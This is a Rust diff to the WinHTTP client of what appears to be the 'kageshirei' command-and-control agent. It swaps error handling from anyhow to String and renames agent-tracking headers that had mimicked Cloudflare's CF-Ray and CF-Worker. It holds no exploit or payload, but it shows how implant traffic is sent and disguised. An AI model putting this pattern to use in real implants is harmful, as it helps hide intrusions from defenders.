@@ -1,11 +1,10 @@
-use alloc::{format, sync::Arc, vec::Vec};
+use alloc::{format, string::String, sync::Arc, vec::Vec};
 use core::{
     ffi::c_void,
     ptr::{null, null_mut},
     sync::atomic::{AtomicPtr, Ordering},
 };
 
-use anyhow::Result;
 use bytes::{BufMut, Bytes, BytesMut};
 use kageshirei_communication_protocol::metadata::Metadata;
 use kageshirei_win32::winhttp::{
@@ -95,7 +94,7 @@ impl WinHttpClient {
     /// # Safety
     /// This function is unsafe because it dereferences raw pointers and interacts with the WinHTTP API,
     /// which requires correct usage of the API and proper management of handles.
-    pub unsafe fn read_response(&self, h_request: *mut c_void) -> Result<Bytes> {
+    pub unsafe fn read_response(&self, h_request: *mut c_void) -> Result<Bytes, String> {
         let mut status_code: u32 = 0;
         let mut status_code_len: u32 = core::mem::size_of::<u32>() as u32;
 
@@ -110,7 +109,7 @@ impl WinHttpClient {
         );
         if b_status_code == 0 {
             let error = nt_get_last_error();
-            return Err(anyhow::anyhow!(
+            return Err(format!(
                 "WinHttpQueryHeaders failed with error: {}",
                 WinHttpError::from_code(error as i32)
             ));
@@ -151,7 +150,7 @@ impl WinHttpClient {
     ///
     /// # Returns
     /// A `Result` containing the response bytes or an error message if the request fails.
-    pub async fn post(&self, iurl: &str, body: Vec<u8>, metadata: Arc<Metadata>) -> Result<Bytes> {
+    pub async fn post(&self, iurl: &str, body: Vec<u8>, metadata: Arc<Metadata>) -> Result<Bytes, String> {
         // Parse the URL to extract the scheme, hostname, port, and path.
         let parsed_url_result: ParseUrlResult = parse_url(iurl);
 
@@ -179,20 +178,20 @@ impl WinHttpClient {
             );
             if h_request.is_null() {
                 let error = nt_get_last_error();
-                return Err(anyhow::anyhow!(
+                return Err(format!(
                     "WinHttpOpenRequest failed with error: {}",
                     WinHttpError::from_code(error as i32)
                 ));
             }
 
-            // Add CF-Ray header
+            // Add X-Request-ID header
             let cf_ray_header = format!("{}.{}", metadata.request_id, metadata.agent_id);
-            let cf_ray_header_str = to_pcwstr(&format!("CF-Ray: {}", cf_ray_header));
+            let cf_ray_header_str = to_pcwstr(&format!("X-Request-ID: {}", cf_ray_header));
             (get_winhttp().win_http_add_request_headers)(h_request, cf_ray_header_str.as_ptr(), -1, 0);
 
-            // Add CF-Worker header
+            // Add X-Identifier header
             let cf_worker_header = metadata.command_id.clone();
-            let cf_worker_header_str = to_pcwstr(&format!("CF-Worker: {}", cf_worker_header));
+            let cf_worker_header_str = to_pcwstr(&format!("X-Identifier: {}", cf_worker_header));
             (get_winhttp().win_http_add_request_headers)(h_request, cf_worker_header_str.as_ptr(), -1, 0);
 
             // Send the POST request with the body data.
@@ -208,7 +207,7 @@ impl WinHttpClient {
             if b_request_sent == 0 {
                 let error = nt_get_last_error();
                 (get_winhttp().win_http_close_handle)(h_request);
-                return Err(anyhow::anyhow!(
+                return Err(format!(
                     "WinHttpSendRequest failed with error: {}",
                     WinHttpError::from_code(error as i32)
                 ));
@@ -219,7 +218,7 @@ impl WinHttpClient {
             if b_response_received == 0 {
                 let error = nt_get_last_error();
                 (get_winhttp().win_http_close_handle)(h_request);
-                return Err(anyhow::anyhow!(
+                return Err(format!(
                     "WinHttpReceiveResponse failed with error: {}",
                     WinHttpError::from_code(error as i32)
                 ));
